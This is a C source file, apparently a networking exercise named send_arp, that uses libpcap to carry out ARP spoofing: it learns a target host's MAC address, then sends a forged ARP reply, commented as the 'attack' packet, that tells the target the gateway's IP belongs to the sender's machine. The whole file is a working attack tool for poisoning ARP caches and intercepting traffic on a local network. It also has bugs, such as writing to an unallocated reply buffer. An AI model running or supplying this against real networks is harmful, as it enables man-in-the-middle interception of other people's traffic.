#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <net/ethernet.h>
#include <stdint.h>

#pragma pack(push,1)
typedef struct ARP{
	uint16_t H_type;
	uint16_t P_type;
	uint8_t H_length;
	uint8_t P_length;
	uint16_t OPcode;
	uint8_t src_h_addr[6];
	uint32_t src_ip;
	uint8_t des_h_addr[6];
	uint32_t des_ip;
}ARP;

typedef struct Ethernet{
	uint8_t des_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
}Ethernet;
#pragma pack(pop)

int Set_request(struct ARP* arp, struct  Ethernet* eth,char* target_IP,char* dev)
{
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	
	sock = socket(AF_INET,SOCK_STREAM,0);
	if(sock < 0) { return 0; }
	strcpy(ifr.ifr_name,dev);
		
	// 인터페이스 IP주소 
	if(ioctl(sock,SIOCGIFADDR,&ifr)<0) { return -1;}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	arp->src_ip = (uint32_t)sin->sin_addr.s_addr;
	
	// 인터페이스 MAC주소
	if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0) { return -1;}	
	memcpy(arp->src_h_addr,ifr.ifr_hwaddr.sa_data,6);
	memcpy(eth->src_mac,ifr.ifr_hwaddr.sa_data,6);
	
	arp->H_type=htons(0x0001);
	arp->P_type=htons(0x0800);
	arp->H_length=0x06;
	arp->P_length=0x04;
	arp->OPcode=htons(0x0001);
	inet_pton(AF_INET,target_IP,&arp->des_ip);
	for(int i=0;i<6;i++)
	{
		arp->des_h_addr[i]= 0x00;
		eth->des_mac[i]=0xff;
	}
	eth->type=htons(0x0806);
	
	return 0;
}
int Set_reply(struct ARP* arp, struct Ethernet* eth,char* gateway_IP,uint8_t* target_mac)
{
	memcpy(eth->des_mac,target_mac,6);
	
	arp->OPcode=htons(0x0002);
	memcpy(arp->des_h_addr,target_mac,6);
	inet_pton(AF_INET,gateway_IP,&arp->src_ip);
}
void usage() {
  printf("syntax: send_arp <interface> <target IP> <gateway IP>\n");
}

int main(int argc, char* argv[]) {
	if(argc !=4)
	{
		usage();
		return -1;
	}	
	struct ARP arp;
	struct Ethernet eth;
	
	struct ARP *cap_arp;
	struct Ethernet *cap_eth;

	char* dev = argv[1];
	char* target_IP = argv[2];
	char* gateway_IP = argv[3];
	uint8_t target_mac[6];

	if(Set_request(&arp,&eth,target_IP,dev) < 0){ return -1;}
	
	u_char* request_packet;
	u_char* reply_packet;
	char errbuf[PCAP_ERRBUF_SIZE];

	request_packet =(u_char *) malloc(sizeof(char)*42);
	
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	
	if(handle == NULL || handle == NULL)
	{
		fprintf(stderr,"couldn't oepn device %s: %s\n",dev, errbuf);
		return -1;
	}
	memcpy(request_packet,&eth,14);	
	memcpy(request_packet+14,&arp,28);
	
	// arp request packet
	for(int i=0;i<42;i++)
	{
		if(i%16 == 0) {printf("\n");}
		printf("%02x ", request_packet[i]);
	}
	printf("\n");	
	
		
	if(pcap_sendpacket(handle,request_packet,42)!= 0)
	{
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}
	
	
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle,&header,&packet);
		if(res == 0) continue;
		if(res == -1 || res == -2 ) break;
		
		cap_eth = (struct Ethernet*)packet;

		if(ntohs(cap_eth->type) == 0x806 )
		{
			cap_arp = (struct ARP*)(packet+14);
			if(arp.src_ip == cap_arp->des_ip)
			{
				memcpy(target_mac,cap_arp->src_h_addr,6);
				break;
			}
		}
	}	
	if(Set_reply(&arp,&eth,gateway_IP,target_mac) < 0){ return -1;}
	memcpy(reply_packet,&eth,14);
	memcpy(reply_packet+14,&arp,28);
	
	/*
	 arp reply packet(attack)
	for(int i=0;i<42;i++)
	{
		if(i%16 == 0) {printf("\n");}
		printf("%02x ", reply_packet[i]);
	}
	*/
	if(pcap_sendpacket(handle, reply_packet,42)!=0)
	{
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}
	pcap_close(handle);
	
	return 0;
}

